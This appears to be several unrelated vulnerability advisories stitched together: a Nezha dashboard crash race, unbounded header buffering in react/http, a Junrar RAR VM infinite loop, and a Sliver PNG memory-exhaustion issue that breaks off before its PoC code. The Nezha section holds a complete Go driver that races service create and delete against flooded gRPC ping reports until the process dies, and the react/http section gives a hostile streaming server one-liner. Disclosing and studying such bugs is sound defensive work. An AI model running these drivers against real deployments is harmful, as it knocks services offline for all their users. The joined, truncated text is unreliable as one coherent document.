## Summary

A single low-privilege `RoleMember` can take the entire Nezha dashboard offline, and with it every tenant's web UI, REST API, and agent connections, by racing two ordinary operations on their own service. The crash is a nil pointer dereference in the service-monitor worker at `service/singleton/servicesentinel.go:601`. The worker checks a service exists under one lock and later writes to two pointer-valued status maps under a different lock; a concurrent delete removes the entries in the gap. Because the gRPC server has no recovery interceptor, the worker-goroutine panic kills the whole process. Availability only: nothing is read or modified.

## Affected versions

Confirmed in `v2.2.7` through `v2.2.10`. `service/singleton/servicesentinel.go` has the same vulnerable implementation in all four releases. The issue is fixed in `v2.2.11` and later; users should upgrade to the latest release, `v2.3.0`. 

## The bug

The worker validates an incoming report and later writes it to two status maps, but the check and the write are guarded by two different locks taken at two different times. Between them, the same member can delete the service and pull the map entries out from under the worker.

The maps hold pointers, so a missing key returns nil and the first field write through it panics:

```
73:  serviceStatusToday       map[uint64]*_TodayStatsOfService
74:  serviceCurrentStatusData map[uint64]*serviceTaskStatus
```

The worker checks presence via `Get`, which takes `servicesLock` and releases it. `canReportServiceResult` rejects a nil service here, so at this point the service is known to exist:

```
532:  cs, _ := ss.Get(r.Data.GetId())          // servicesLock.RLock / RUnlock
535:  if !canReportServiceResult(cs, reporter, r.Data.GetType()) { continue }
```

For TCP/ICMP ping results, every `AvgPingCount` (default 2, TSDB off) the worker does a synchronous `DB.Create` at `:569` holding neither status-map lock, which stretches the gap into an easily raceable window. It then takes a *different* lock and dereferences the maps with no recheck and no lazy create:

```
597:  ss.serviceResponseDataStoreLock.Lock()
600:  ss.serviceStatusToday[mh.GetId()].Delay = ...   // nil deref if deleted meanwhile
609:  ss.serviceCurrentStatusData[mh.GetId()].t ...   // same hazard
```

Meanwhile `Delete` removes both entries under `serviceResponseDataStoreLock`, running on the HTTP-handler goroutine, a different goroutine from the single worker:

```
378:  func (ss *ServiceSentinel) Delete(ids []uint64) {
387:      delete(ss.serviceCurrentStatusData, id)
390:      delete(ss.serviceStatusToday, id)
```

The precise point: the check reads the `services` map under `servicesLock`; the write touches `serviceStatusToday` under `serviceResponseDataStoreLock`. Holding the second lock at `:600` proves nothing about whether the entry survived, because the delete ran under that same lock while the worker was still busy between the two operations. This is a cross-lock TOCTOU, not a data race. Every access to the two maps is correctly synchronized under one lock, so `-race` reports nothing; the staleness lives across the two locks, not inside one memory location.

Two supporting facts. The ping map a few lines up self-heals on a miss (`:543`), so it never faces this; the two status maps never do. And the gRPC server is built with only real-IP and WAF interceptors (`cmd/dashboard/rpc/rpc.go:37`), no recovery, so the worker panic is fatal to the whole process rather than a dropped request.

## Reachability

Both legs are things a member is meant to do with their own resources: report ping results over gRPC with their own agent secret, and create/delete their own service over `POST /api/v1/service` and `POST /api/v1/batch-delete/service`, which pass `CheckPermission` for an owned service. No admin rights, no other tenant involved. `batchDeleteService` reaches `ServiceSentinel.Delete` synchronously on a separate goroutine from the worker, so the two interleave freely.

## Code flow

```
member agent -> gRPC RequestTask stream -> TaskResult{Id: ownedSvc, Type: TCPPing}
  -> service/rpc/nezha.go: IsServiceSentinelNeeded(TCPPing) -> Dispatch(ReportData{...})
  -> serviceReportChannel -> single worker goroutine:
        Get(id)  [servicesLock] present ......+  <- TOCTOU check (:532/:535)
        DB.Create(ServiceHistory)  (gap)      |
                                              |  member HTTP: POST /api/v1/batch-delete/service
                                              |  -> batchDeleteService (CheckPermission: own OK)
                                              |  -> ServiceSentinel.Delete([id]) (synchronous)
                                              |     [serviceResponseDataStoreLock] delete(serviceStatusToday,id)
        serviceResponseDataStoreLock.Lock() <-+
        serviceStatusToday[id].Delay = ...      <- id now absent -> nil deref -> SIGSEGV (:600)
```

## Proof of concept

Environment: dashboard built from `fd31e5f1` on go1.26.4, SQLite, bound to `127.0.0.1:8008`, with `avg_ping_count: 2` and TSDB disabled (both defaults). Everything runs against the real running binary using the project's own generated proto client and a plain HTTP client. No mocks, no in-process calls. The driver uses only the member's own credentials, targets only the member's own service, and is strictly for local authorized testing.

### The driver

Placed at `cmd/pocdos/main.go` inside a checkout of the target repo (so the `github.com/nezhahq/nezha/proto` import resolves), built with `go build ./cmd/pocdos`.

```go
import (
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/metadata"

	pb "github.com/nezhahq/nezha/proto"
)

var (
	grpcAddr = flag.String("grpc", "127.0.0.1:8008", "")
	baseURL  = flag.String("url", "http://127.0.0.1:8008", "")
	secret   = flag.String("secret", "", "m1 agent secret")
	uuid     = flag.String("uuid", "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", "")
	token    = flag.String("token", "", "m1 jwt")
	csrf     = flag.String("csrf", "", "m1 csrf")
	dur      = flag.Duration("dur", 90*time.Second, "")
	churn    = flag.Int("churn", 16, "concurrent create/delete workers")
)

var httpc = &http.Client{Timeout: 5 * time.Second, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, MaxIdleConnsPerHost: 256}}

func req(method, path string, body []byte) ([]byte, int) {
	r, _ := http.NewRequest(method, *baseURL+path, bytes.NewReader(body))
	r.Header.Set("Content-Type", "application/json")
	r.Header.Set("Authorization", "Bearer "+*token)
	r.Header.Set("X-CSRF-Token", *csrf)
	r.AddCookie(&http.Cookie{Name: "nz-csrf", Value: *csrf})
	r.AddCookie(&http.Cookie{Name: "nz-jwt", Value: *token})
	resp, err := httpc.Do(r)
	if err != nil {
		return []byte(err.Error()), 0
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return b, resp.StatusCode
}

func createSvc() (uint64, bool) {
	b, _ := req("POST", "/api/v1/service", []byte(`{"name":"p","target":"127.0.0.1:8008","type":3,"cover":0,"duration":30}`))
	var id uint64
	if n, _ := fmt.Sscanf(string(b), `{"success":true,"data":%d}`, &id); n == 1 {
		return id, true
	}
	return 0, false
}

func deleteSvc(id uint64) {
	req("POST", "/api/v1/batch-delete/service", []byte(fmt.Sprintf("[%d]", id)))
}

func main() {
	flag.Parse()
	rand.Seed(time.Now().UnixNano())

	conn, err := grpc.NewClient(*grpcAddr, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatal(err)
	}
	cli := pb.NewNezhaServiceClient(conn)
	authCtx := func(ctx context.Context) context.Context {
		return metadata.AppendToOutgoingContext(ctx, "client_uuid", *uuid, "client_secret", *secret)
	}

	// 1) register a server owned by m1
	if _, err := cli.ReportSystemInfo2(authCtx(context.Background()), &pb.Host{Platform: "poc", Arch: "poc"}); err != nil {
		log.Fatalf("register(ReportSystemInfo2) rejected: %v", err)
	}
	log.Println("server registered as m1 agent")

	// 2) open the RequestTask bidi stream (this agent now holds the task stream)
	stream, err := cli.RequestTask(authCtx(context.Background()))
	if err != nil {
		log.Fatalf("RequestTask open: %v", err)
	}
	go func() { // drain server->agent Task frames
		for {
			if _, err := stream.Recv(); err != nil {
				return
			}
		}
	}()

	// shared set of currently-alive service ids
	var mu sync.Mutex
	active := map[uint64]struct{}{}
	addID := func(id uint64) { mu.Lock(); active[id] = struct{}{}; mu.Unlock() }
	delID := func(id uint64) { mu.Lock(); delete(active, id); mu.Unlock() }
	snapshot := func() []uint64 {
		mu.Lock()
		defer mu.Unlock()
		out := make([]uint64, 0, len(active))
		for id := range active {
			out = append(out, id)
		}
		return out
	}

	var sent, dels int64
	stop := time.After(*dur)
	var wg sync.WaitGroup

	// churn workers: create -> arm -> delete
	for i := 0; i < *churn; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
				}
				id, ok := createSvc()
				if !ok {
					time.Sleep(time.Millisecond)
					continue
				}
				addID(id)
				// let the flood push a few reports for this id into the worker's gap
				time.Sleep(time.Duration(1+rand.Intn(3)) * time.Millisecond)
				deleteSvc(id)
				delID(id)
				atomic.AddInt64(&dels, 1)
			}
		}()
	}

	// single flood goroutine (grpc stream Send is not concurrency-safe)
	wg.Add(1)
	go func() {
		defer wg.Done()
		for {
			select {
			case <-stop:
				return
			default:
			}
			ids := snapshot()
			for _, id := range ids {
				if err := stream.Send(&pb.TaskResult{
					Id:         id,
					Type:       3, // TCPPing
					Delay:      float32(1 + rand.Intn(50)),
					Successful: true,
				}); err != nil {
					fmt.Printf("STREAM_SEND_ERR=%v (dashboard likely crashed)\n", err)
					return
				}
				atomic.AddInt64(&sent, 1)
			}
		}
	}()

	// liveness probe: if the dashboard process dies, the API stops answering
	go func() {
		for {
			select {
			case <-stop:
				return
			case <-time.After(500 * time.Millisecond):
				_, code := req("GET", "/api/v1/user", nil)
				if code == 0 {
					fmt.Printf("LIVENESS_FAIL at sent=%d dels=%d, dashboard not answering\n", atomic.LoadInt64(&sent), atomic.LoadInt64(&dels))
					os.Exit(7)
				}
			}
		}
	}()

	wg.Wait()
	fmt.Printf("DONE without crash: sent=%d deletes=%d\n", atomic.LoadInt64(&sent), atomic.LoadInt64(&dels))
}
```

The gRPC leg registers a server under the member's own agent secret via `ReportSystemInfo2`, opens `RequestTask`, then floods `TaskResult{Type: 3 (TCPPing)}` for every alive service id from a single goroutine (`stream.Send` is not concurrency-safe). The REST leg's churn workers loop `createSvc` → sleep 1–3 ms to let the flood push repeated reports into the worker's gap → `deleteSvc`, which fires `ServiceSentinel.Delete` and removes the map entry the worker is about to dereference. The liveness probe hits `GET /api/v1/user` every 500 ms and exits 7 on connection refused, which is the crash signal.

### Steps to reproduce

1. In a checkout of nezha at `fd31e5f1`, drop the file at `cmd/pocdos/main.go` and build: `go build -o pocdos ./cmd/pocdos`.
2. Start the dashboard (SQLite, `avg_ping_count: 2`, TSDB off) and complete first-run. Create a `RoleMember`, register a server under its agent secret, and log the member in to obtain its JWT and CSRF.
3. Run with the member's own credentials: `./pocdos -secret "$M1_AGENT_SECRET" -token "$M1_JWT" -csrf "$M1_CSRF" -dur 30s -churn 4`.

### Results

On an unpatched build the driver prints `STREAM_SEND_ERR=EOF` + `LIVENESS_FAIL` + exit 7 within about half a second, and the dashboard's stderr shows the panic:

```
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x10 pc=0x12966c8]
github.com/nezhahq/nezha/service/singleton.(*ServiceSentinel).worker(...)
    .../service/singleton/servicesentinel.go:601
created by ...NewServiceSentinel in goroutine 1
    .../service/singleton/servicesentinel.go:127
```

Process death confirmed right after: `ps -p <pid>` shows the pid gone, `curl http://127.0.0.1:8008/api/v1/` returns `http_code=000`, `ss -ltn | grep 8008` shows no listener.

Under `go build -race` the same run reports zero `WARNING: DATA RACE` and still crashes with the identical nil-deref, which confirms this is a logical cross-lock TOCTOU rather than a memory race. Under a normal build, reproducibility with a fresh database per trial, a 30-second cap, and four churn workers was 5 of 5, mean time-to-crash 0.5s. Each individual window is small, but the driver retries it tens of thousands of times a second and wins by volume, so it is fast and reliable, not a lucky single shot. `-churn 4` was already 5/5; the `16` default is heavier than needed.

## Fix

Fixed in commit `c893aa57867d8a3d608e2f2f16d1594c9766cdf3`, released as `v2.2.11` and `v2.3.0`. The worker now acquires `serviceResponseDataStoreLock` before any report side effect, re-reads the current service and status entries, and re-runs `canReportServiceResult` while the lifecycle lock is held. `Delete` and `Update` therefore serialize with report processing, so reports for deleted services or reports invalidated by an update are discarded before history, status, notification, or TLS side effects.

The fix also clears ping and TLS caches during deletion and makes `LoadStats` follow the lifecycle lock order, preventing stale cache state and an ABBA deadlock window. Deterministic lifecycle tests cover deletion, update revalidation, lock order, and TLS side effects. The full unit suite, race-and-shuffle suite, `go vet`, CodeQL, and release builds passed before publication.

### Summary

`React\Http\Browser` and its lower-level HTTP stack impose no limit on the size of a response's header section while it is being received. `ClientRequestStream::handleData()` appends every incoming byte to an internal buffer and only scans that buffer for the `\r\n\r\n` (or `\n\n`) terminator, without ever checking its length. A remote server that withholds the terminator and keeps streaming can grow the client's memory without bound until PHP's `memory_limit` is exhausted and the process crashes.

This is an unauthenticated, network-reachable denial of service against any application that uses `react/http` as a client to fetch untrusted or attacker-influenced URLs, including via redirects.

### Details

`ClientRequestStream::handleData()` is bound directly to the underlying connection's `data` event, so every byte the peer sends is appended with no size check:

```php
public function handleData($data)
{
    $this->buffer .= $data;

    // buffer until double CRLF (or double LF for compatibility with legacy servers)
    $eom = \strpos($this->buffer, "\r\n\r\n");
    $eomLegacy = \strpos($this->buffer, "\n\n");
    if ($eom !== false || $eomLegacy !== false) {
```

The only exit from the buffering state is finding the header terminator or a connection close, so until it arrives the buffer grows monotonically for as long as the peer keeps sending.

The codebase already applies this class of limit elsewhere, but not symmetrically. `RequestHeaderParser` caps incoming **request** headers when acting as a server, and `Transaction::bufferResponse()` caps the response **body**, but only once the header section has already been parsed into a `Response`. Response header reception was the one stage with no limit at all.

### PoC

An HTTP server that sends a valid status line and a partial header, then streams indefinitely without ever terminating the header section:

```bash
php -r '$s=stream_socket_server("tcp://127.0.0.1:18080"); $c=stream_socket_accept($s); fread($c,8192); fwrite($c,"HTTP/1.1 200 OK\r\nX-Fill: "); while (true) { fwrite($c, str_repeat("A",1048576)); usleep(10000); }'
```

A client fetching it, with `memory_limit=64M`:

```php
$browser = new React\Http\Browser();
$browser->get("http://127.0.0.1:18080/")->then(
    function () { echo "ok\n"; },
    function ($e) { echo get_class($e) . ": " . $e->getMessage() . "\n"; }
);
```

Client memory grows steadily until the process dies with `Allowed memory size ... exhausted` inside `ClientRequestStream::handleData()`.

### Impact

Remotely triggerable, unauthenticated denial of service against any process using `Browser` to fetch from an attacker-controlled, compromised or otherwise untrusted endpoint, including one reached through a redirect. No user interaction and no special privileges are required. Because there is no upper bound on the header buffer, a single cheap connection can drive memory arbitrarily high and crash the process, taking down whatever event loop or worker it was running. Confidentiality and integrity are unaffected; availability is fully impacted for that process.

### Summary

Junrar's RAR virtual machine can be forced into a deterministic infinite loop while extracting a crafted RAR4 archive. The `RarVM.ExecuteCode` loop is intended to be bounded by `maxOpCount`, but jump instructions can bypass this limit when `setIP()` is called with a target instruction pointer greater than or equal to `codeSize`.

An unauthenticated attacker who can provide a RAR archive to an application using `Junrar.extract()` can cause the extraction thread to spin forever, consuming CPU and blocking the process. The issue is a denial of service vulnerability, not remote code execution.

### Details

The root cause is in `src/main/java/com/github/junrar/unpack/vm/RarVM.java`.

`setIP()` returns early when the target IP is outside the prepared VM program:

```java
private boolean setIP(int ip) {
    if ((ip) >= codeSize) {
        return (true);
    }

    if (--maxOpCount <= 0) {
        return (false);
    }

    IP = ip;
    return true;
}
```

When `ip >= codeSize`, this branch:

- does not update `IP`;
- does not decrement `maxOpCount`;
- returns `true`, so callers treat it as success.

The `VM_JMP` handler and the other jump-like handlers discard the return value of `setIP()` and immediately `continue` the main VM loop:

```java
case VM_JMP:
    setIP(getValue(false, mem, op1));
    continue;
```

Because of the `continue`, execution also skips the loop-end accounting:

```java
IP++;
--maxOpCount;
```

As a result, a VM program containing a single `VM_JMP` instruction can freeze both `IP` and `maxOpCount`:

1. `IP` points to the `VM_JMP` instruction.
2. The jump target resolves to `codeSize` or larger.
3. `setIP()` returns before modifying `IP` or decrementing `maxOpCount`.
4. The caller ignores the return value and continues.
5. The same `VM_JMP` instruction is executed again forever.

### Impact

This is a CPU denial of service vulnerability. Any application that uses junrar to extract untrusted RAR archives can have an extraction worker thread permanently blocked by a small crafted archive. In services that process uploads or attachments automatically, repeated submissions can exhaust worker capacity and degrade or stop archive-processing functionality.

The RAR VM does not provide native code execution, reflection, or process execution primitives, and Java array bounds checks prevent escaping the VM memory array. The expected security impact is availability only.

### Summary
Sliver is vulnerable to a Denial of Service (DOS) attack because there is no cap in the size of a PNG file that can be sent to an open http listener and there is a small amount of possible nonces. This vulnerability lets the attacker completely max out the RAM of the machine running server, leading to a complete loss of availability. 
### Details

The first vulnerability is that the amount of possible nonces is 65,537. This is found in `server/encoders/encoders.go`
```go
const (
    EncoderModulus = uint64(65537)
)
```

The second vulnerability is there is no limit to how many pixels the PNG encoder will accept from an unauthenticated user. This is found in:
`util/encoders/images.go`

```go
func (p PNGEncoder) Encode(data []byte) ([]byte, error) {
    img := imageFromBytes(data)
    var buf bytes.Buffer
    encoder.Encode(&buf, img)
    return buf.Bytes(), nil
}

func (p PNGEncoder) Decode(data []byte) ([]byte, error) {
    buf := bytes.NewBuffer(data)
    img, err := png.Decode(buf)
    if err != nil { return nil, err }
    return bytesFromImage(img), nil
}
```

### PoC
The first step to reproduce this vulnerability is building a docker container to make sure no harm is caused.

Get the latest version of Sliver (Currently 1.7.3)
```bash
git clone https://github.com/BishopFox/sliver.git
```

Build the Docker container:
```bash
cd sliver
docker build -t sliver-test:local -f Dockerfile .
```

Run the Docker container with a memory cap for example 4GB:
```bash
docker run --rm \
--name sliver-test \
--memory=4g \
-p 8080:8080 \
-it \
sliver-test:local 
```

After the Docker container starts, create an http listener on port 8080:

```bash
http -L 0.0.0.0 -l 8080
```

In a seperate terminal create the following Go project:
`go.mod`
```Go
module pngboomer
go 1.25
```

`poc.go`
